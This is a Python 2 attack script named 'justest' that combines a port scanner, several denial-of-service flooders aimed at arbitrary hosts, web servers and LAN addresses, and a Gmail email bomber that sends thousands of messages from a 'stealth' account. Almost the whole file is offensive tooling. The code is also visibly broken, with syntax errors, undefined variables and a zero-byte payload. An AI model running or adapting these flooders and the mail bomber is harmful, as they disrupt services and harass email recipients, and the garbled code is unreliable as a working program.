#!/usr/bin/python

__author__   = 'vickydasta'
__appsname__ = 'justest'
__version__  = '1.2'
__date__     = '08/02/15'

import smtplib
import socket
import sys
import time
import smtplib
import email
import os
import random
import socket
import string
from email.MIMEMultipart import MIMEMultipart
from email.Utils import COMMASPACE
from email.MIMEBase import MIMEBase
from email.parser import Parser
from email.MIMEImage import MIMEImage
from email.MIMEText import MIMEText
from datetime import datetime 

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def scanport(ip):
    if 'http://' not in ip:
        for port in range(1,1025):
            cek=sock.connect_ex((ip ,port))
            if cek == 0:
                print 'port : {} --> open'.format(port)
            else:
                print 'port : {} --> closed'.format(port)

        ip=socket.gethostbyname(ip)
        print '[-] scanning ' + str(ip)
        for port in range(1,4000):
            check=sock.connect_ex((ip, port))
            if check == 0:
                print 'port : {} --> open'.format(port)
            else:
                print 'port : {} --> closed'.format(port)

def collectgarbage(url):
    # collect some garbage
    # from urllib and read given url data
    # html's contains unexpected string,it should be able to
    # slow down the target's machine
    import urllib2
    data=urllib2.urlopen(url)
    return data.read()

def dosMethod2(ip,port_ip):
    if not ip and not port_ip:
        sys.exit('ip and port not defined')
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    byte = random._urandom(0)
    try:
        sock.connect((target_ip,port_ip))
    except:
        print '[-] Unable to resolve host...'
        time.sleep(3)
    while 1 == 1:
        try:
            while 1==1:
                for i in range (1,10000):
                    print '[+] now sending {} to {}'.format(byte,target_ip)
                    sock.sendall(byte)
                    sock.sendall(byte)
        except OverflowError as e:
            print '[+] error' + str(e)

def webserver(host,itter,packets):
    """
       webserver (apache) testing module for Denial of Service Attack Proof of Concept
       host   : <url>
       itter  : how many itteration (int)
       packets: what packets ? 
       better using collectgarbage(url)  """
    port = 80
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error, msg:
        print '[-] failed to create socket. Error code: ' + str(msg)
        print '[+] Socket created'
    try:
        remote_ip = socket.gethostbyname(host)
    except socket.gaierror:
        print "[-] Hostname could not be resolved... Exiting..."
        sys.exit()
    try:
        s.connect((host, port))
    except socket.error:
        print "[-] socket error"
    print '[+] Connected to ' + host , ":" , port
    message = "POST / HTTP/1.1\r\n\r\n"
    try:
        for i in range(1,itter):
            s.sendall(message)
            s.sendall("POST /" + host + "HTTP/1.1")
            s.sendall("GET /" + host + "HTTP/1.1\r\n\r\n")
            print "[+] sending packet(s) {} to {}".format(i,host)
            print i ," packets has been sent to {}".format(host)
    except socket.error:
            print '[-] sending packets failed...'
            print '[=] ' + host + " rejecting packets or its not vulnerable with DoS attack"

def LAN(ip,port=443,pckts):
    '''set default port into 443
       ip = 192.*.*.* or 10.*.*.*
       pckt= collectgarbage(url)
       or define yours
       '''
    try:
        if pckts:
            pck = True
    except RuntimeError:
        print 'pckts not spesified'
        sys.exit(0)
    while pck is not False:
        konek = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sck = konek.connect((ip, port))
            print '[+] Connected to {}'.format(ip)
            print '[+] Now Sending Packet(s) to ' + str(ip)
        except Exception as e:
            print 'Unable to resolve host {}'.format(ip) 
        try:
            for i in range(1,100000):
                konek.sendall(pckts)
                ftime = datetime.now()
                print '[+] ' ,i , ' packets has been sent to ' ,ip
        except Exception as e:
            scndtime = datetime.now()
            print '{}'.format(e)
            print '[+] Stoped on {}'.format(scndtime - ftime)

def spammer(mail,passw,multi=False,subj,to,msg):
    # if mutli = False,openfile mode = False
    if multi == False:
        openfile = False
    smtp_host = 'smtp.gmail.com'
    smtp_port = 587
    server = smtplib.SMTP()
    server.connect(smtp_host,smtp_port)
    server.ehlo()
    server.starttls()
    print '[+] Connected to {} : port {}'.format(smtp_host, smtp_port)  
    try:
        server.login(user,passw)
    except Exception as e:
        print '{}'.format(e)
    try:
        spam = open(fromaddr,'r')
    except IOError as e:
        print '[+] Unable to find ' + str(fromaddr)
        time.sleep(3)
        return tanya()
    sub = raw_input('[+] Subject: ')
    msg = email.MIMEMultipart.MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = email.Utils.COMMASPACE.join(fromaddr)
    msg['Subject'] = sub
    msg.attach(MIMEText(raw_input('[+] Body: ')))
    msg.attach(MIMEText('\n test, 'plain'))
    try:
        ftime = datetime.now()
        for a in spam.readlines():
            for i in range(1, 5):
                server.sendmail(user,a,msg.as_string())
                print '[+] ',i ,' e-mail(s) sent to ' + str(a)
    except Exception as e:
        scndtime = datetime.now()
        print '[-] {} at '.format(scndtime - ftime)

def shitsmail():
    
    smtp_host = 'smtp.gmail.com'
    smtp_port = 587
    server = smtplib.SMTP()
    server.connect(smtp_host,smtp_port)
    server.ehlo()
    server.starttls()
    print '[+] Connected to ' , smtp_host , ' on port ' , smtp_port
    print banner

    ask = raw_input('[?] > ')
    while ask != 'exit':
        if ask == 1:
            spammer()
        if ask == 2:
            t1 = datetime.now()
            os.system('clear')
            print '[+] Boom E-Mail Activated...'
            smtp_host = 'smtp.gmail.com'
            smtp_port = 587
            server = smtplib.SMTP()
            server.connect(smtp_host,smtp_port)
            server.ehlo()
            server.starttls()
            print '[+] Connected to ' , smtp_host , ' on port ' , smtp_port
            print '[+] USE YOUR STEALTH GMAIL ADDRESS OR TAKE IT WITH YOUR OWN RISK !!!'    
            user = raw_input('[+] >> Gmail Address > ')
            passw = raw_input('[+] >> Gmail Password > ')
            try:
                server.login(user,passw)
            except Exception as e:
                print str(e)
                msg = email.MIMEMultipart.MIMEMultipart()
                msg['From'] = fromaddr
                msg['To'] = email.Utils.COMMASPACE.join(tolist)
                msg['Subject'] = sub
                msg.attach(MIMEText(msg)
                msg.attach(MIMEText('\n test', 'plain'))
            try:
                d1 = datetime.now()
                for i in range(1, 10000):
                    server.sendmail(user,tolist,msg.as_string())
                    print '[+] ',i ,' e-mail(s) sent to ' + str(tolist)
            except Exception as e:
                print '[+] Total sent : ' ,i-1 ,'mails'
                print '[+] Error : ',str(e)
                d2 = datetime.now()
                print '[-} Error at ' ,d2 - d1
                return ask()
        else:
            sys.exit(0)
